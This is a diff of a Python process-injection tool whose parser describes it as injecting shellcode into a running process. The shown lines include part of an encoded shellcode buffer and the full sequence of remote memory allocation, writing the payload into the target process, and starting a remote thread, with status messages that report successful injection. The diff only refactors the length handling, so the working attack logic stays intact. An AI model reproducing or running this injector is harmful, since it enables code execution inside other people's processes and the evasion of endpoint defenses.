@@ -2,7 +2,7 @@ from process_injector import ProcessInjector
 from argparse import ArgumentParser
 
 if __name__ == "__main__":
-    parser = ArgumentParser()
+    parser = ArgumentParser("Inject shellcode into a running process")
     parser.add_argument(
         "-p", "--pid",
         action="store_true",
@@ -61,11 +61,11 @@ if __name__ == "__main__":
     buf += "\xa8\x58\x7e\xe3\x0e"
    
     with ProcessInjector(args.PROC, pid=args.pid) as ps_handle:
-        # Allocating memory in target process with VirtualAllocEx
-        base_addr = ps_handle.virtual_alloc_ex(len(buf))
+        buf_len = len(buf)
+        base_addr = ps_handle.virtual_alloc_ex(buf_len)
         print(f"Base Address @ {base_addr}")
         print("[+] Writing data into allocated memory...")
-        ps_handle.write_process_memory(buf, len(buf))
+        ps_handle.write_process_memory(buf, buf_len)
         print("[+] Creating remote thread...")
         ps_handle.create_remote_thread()
         print("[+] Remote process memory injection Successful ...")
